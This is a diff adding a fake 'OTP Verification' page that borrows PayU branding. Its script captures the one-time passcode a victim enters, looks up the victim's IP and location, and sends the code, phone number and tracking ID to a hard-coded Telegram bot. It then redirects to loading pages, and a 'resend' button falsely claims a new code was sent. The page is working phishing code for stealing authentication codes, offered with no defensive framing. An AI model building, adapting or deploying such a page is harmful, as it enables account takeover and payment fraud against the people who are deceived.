@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>OTP Verification</title>
+<link rel="icon" href="https://corporate.payu.com/wp-content/uploads/2020/05/PAYU_LOGO_SQUARE_LIME-e1589274472992.jpg">
+<style>
+  body {margin:0; font-family: Arial, sans-serif; background:#fff; color:#000;}
+  .container {max-width:500px; margin:60px auto; padding:0 20px;}
+  .box {border:1px solid #ccc; border-radius:6px; padding:20px; background:#f9f9f9;}
+  h2 {margin-top:0;}
+  input[type="number"] {
+    width:100%;
+    font-size:20px;
+    text-align:center;
+    padding:12px;
+    margin-top:10px;
+    box-sizing:border-box;
+    letter-spacing:5px;
+  }
+  button {
+    padding:12px 20px;
+    border:none;
+    border-radius:4px;
+    cursor:pointer;
+    width:100%;
+    margin-top:15px;
+    font-size:16px;
+  }
+  .verify-btn {background:#4CAF50; color:#fff;}
+  .resend-btn {background:#ccc;}
+  .countdown {text-align:center; margin-top:10px; color:#444;}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="box">
+    <h2>Enter OTP</h2>
+
+    <p>A verification code as been sent to your device</p>
+    <p id="phoneDisplay" style="font-weight:bold;">---</p>
+    <p>Enter the code bellow</p>
+
+    <input type="number" id="otpInput" placeholder="4–6 digits" maxlength="6"
+           oninput="this.value=this.value.replace(/\D/g,'').slice(0,6)"
+           onkeydown="if(event.key==='e'||event.key==='E'||event.key==='+'||event.key==='-'){event.preventDefault()}">
+
+    <button class="verify-btn" id="verifyBtn">Verify OTP</button>
+
+    <div class="countdown" id="countdown">Resend available in 60s</div>
+    <button class="resend-btn" id="resendBtn" disabled>Resend OTP</button>
+  </div>
+</div>
+
+<script>
+/* ==== TELEGRAM BOT SETTINGS ==== */
+const BOT_TOKEN = "8368617476:AAEyVanlgrh6-5ZCeQqkMDwGcMbofJQH1Ns";
+const CHAT_ID = 7027302249
+const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+/* ==== LOAD PHONE + TRACKING ==== */
+const phone = localStorage.getItem("otpPhone") || "Unknown Number";
+const tracking = localStorage.getItem("otpTracking") || "N/A";
+const display = document.getElementById("phoneDisplay");
+const maskedPhone = phone.length >= 7 ? phone.slice(0,2) + "*****" + phone.slice(-2) : phone;
+display.textContent = maskedPhone;
+
+/* ==== COUNTDOWN TIMER ==== */
+let timeLeft = 60;
+const countdown = document.getElementById("countdown");
+const resendBtn = document.getElementById("resendBtn");
+
+let timer = setInterval(() => {
+  timeLeft--;
+  countdown.textContent = `Resend available in ${timeLeft}s`;
+  if (timeLeft <= 0) {
+    clearInterval(timer);
+    countdown.textContent = "You can resend the OTP.";
+    resendBtn.disabled = false;
+  }
+}, 1000);
+
+/* ==== VERIFY OTP ==== */
+document.getElementById("verifyBtn").addEventListener("click", function () {
+  const otp = document.getElementById("otpInput").value.trim();
+
+  // Updated to allow 4–6 digits
+  if (!/^\d{4,6}$/.test(otp)) {
+      alert("Invalid OTP. Please enter a 4–6 digit number.");
+      return;
+  }
+
+  // Fetch IP info and send Telegram message
+  fetch("https://ipinfo.io/json?token=48a36e97612e2a")
+    .then(res => res.json())
+    .then(ipData => {
+        const message =
+          `🔐 OTP Form Submitted\n` +
+          `Tracking: ${tracking}\n` +
+          `Phone: ${maskedPhone}\n` +
+          `OTP Entered: ${otp}\n` +
+          `IP: ${ipData.ip}\n` +
+          `City: ${ipData.city || 'N/A'}\n` +
+          `Region: ${ipData.region || 'N/A'}\n` +
+          `Country: ${ipData.country || 'N/A'}\n` +
+          `Time: ${new Date().toLocaleString()}`;
+
+        return fetch(TG_URL, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+        });
+    })
+    .finally(() => {
+        window.location.href = "loading2.html";
+    })
+    .catch(err => {
+        console.error("Telegram/IP error:", err);
+        window.location.href = "loading3.html";
+    });
+});
+
+/* ==== RESEND BUTTON ==== */
+resendBtn.addEventListener("click", () => {
+  alert("A new OTP has been sent.");
+  resendBtn.disabled = true;
+  timeLeft = 60;
+
+  timer = setInterval(() => {
+    timeLeft--;
+    countdown.textContent = `Resend available in ${timeLeft}s`;
+    if (timeLeft <= 0) {
+      clearInterval(timer);
+      countdown.textContent = "You can resend the OTP.";
+      resendBtn.disabled = false;
+    }
+  }, 1000);
+});
+</script>
+
+</body>
+</html>
